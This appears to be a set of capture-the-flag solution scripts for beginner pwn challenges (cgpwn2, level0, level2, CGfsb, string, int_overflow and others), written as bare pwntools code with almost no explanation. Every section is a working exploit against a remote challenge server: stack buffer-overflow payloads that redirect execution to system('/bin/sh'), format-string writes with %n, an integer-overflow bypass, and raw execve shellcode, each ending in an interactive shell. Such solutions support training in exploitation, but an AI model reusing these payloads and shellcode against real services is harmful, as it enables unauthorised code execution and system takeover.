# cgpwn2
```python
from pwn import*
p=remote('111.198.29.45','43090')

naddr=0x804a080
sysaddr=0x8048420

pay='a'*(0x26+4)+p32(sysaddr)+'a'*4+p32(naddr)

p.recv()
p.sendline('/bin/sh\x00')

p.recv()
p.sendline(pay)

p.interactive()
```

# when_did_you_born

```python
from pwn import *
p=remote('111.198.29.45',38206)
pay1='1999'
pay2='a'*8+p64(1926)
p.recvuntil('?')
p.sendline(pay1)
p.recvuntil('?')
p.sendline(pay2)
p.interactive()
```

# CGfsb

```python
from pwn import *
p=remote('111.198.29.45',57986)

addr=0x0804a068
pay1='ffdy'
pay2=p32(addr)+'a'*4+'%10$n'

p.recvuntil(':')
p.sendline(pay1)
p.recvuntil(':')
p.sendline(pay2)
p.interactive()
```

# hello_pwn

```python
from pwn import *
pay='a'*4+p64(1853186401)
p=remote('111.198.29.45',35522)
p.recvuntil('bof')
p.sendline(pay)
p.interactive()
```

# level0

```python
from pwn import *
p=remote('111.198.29.45',51703)
addr=0x400596
pay='a'*(0x80+8)+p64(addr)
p.sendline(pay)
p.interactive()
```

# level2

```python
from pwn import *

p=remote('111.198.29.45',48633)

elf=ELF('./level2-6')
saddr=elf.symbols['system']
binaddr=elf.search('/bin/sh').next()
#saddr=0x8048320
#binaddr=0x804a024

pay='a'*(0x88+4)+p32(saddr)+'a'*4+p32(binaddr)
p.recvuntil('Input:')
p.sendline(pay)
p.interactive()
```

# guess_num
```cpp
#include<cstdio>
#include<cstring>
#include<algorithm>
int main(){
	srand(1);
	for(int i=0;i<=9;i++){
		printf("%d ",rand()%6+1);
	}
	return 0;
} 
```
```python
from pwn import *

p=remote('111.198.29.45',36870)

pay='a'*(0x30-0x10)+p64(0)

s='2 5 4 2 6 2 5 1 4 2'
s=s.split(' ')

p.recvuntil(':')
p.sendline(pay)
for i in range(10):
    p.recvuntil(':')
    p.sendline(s[i])

p.interactive()
```
# string
```python
from pwn import *
#p=process('./string')
p=remote('111.198.29.45',51436)

p.recvuntil('secret[0] is ')
v4_addr=p.recvuntil('\n')
v4_addr=int(v4_addr[:-1],16)

pay='%85c%7$n'

p.recvuntil('be:')
p.sendline('ffdy')

p.recvuntil('up?:')
p.sendline('east')

p.recvuntil('(0)?:')
p.sendline('1')

p.recvuntil("address'")
p.sendline(str(v4_addr))

p.recvuntil("is:")
p.sendline(pay)

# shellcode=shellcraft.sh()
shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05" 

p.recvuntil("USE YOU SPELL")
p.sendline(shellcode)
p.interactive()

#AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
```

# int_overflow
```python
from pwn import *
p=remote('111.198.29.45',47132)

addr=0x804868b
pay='a'*(0x14+4)+p32(addr)+'a'*(262-0x14-4-4)

p.recvuntil('choice:')
p.sendline('1')

p.recvuntil('username:')
p.sendline('ffdy')

p.recvuntil('passwd:')
p.sendline(pay)
p.interactive()
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbODE5NTQyMTk5LDE4NjA5MzI1MTIsMTQzMT
c1NjM5NCw2MDU0NjcxMV19
-->